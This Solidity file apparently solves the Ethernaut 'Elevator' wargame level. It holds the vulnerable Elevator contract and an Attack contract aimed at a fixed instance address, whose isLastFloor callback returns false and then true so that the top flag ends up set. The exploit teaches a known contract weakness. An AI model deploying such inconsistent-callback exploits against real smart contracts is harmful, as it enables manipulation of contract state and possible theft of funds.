// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


contract Attack{

    uint counter;

    Elevator public elevator = Elevator(0x6D1B9E9C7aBE739033b831927408207B1a962ec6);


    function attack() public payable{
        elevator.goTo(0);
    }

    function isLastFloor(uint number) external returns (bool){
        counter++;
        if(counter>1)
        {
            return true;
        }
        return false;
    }

}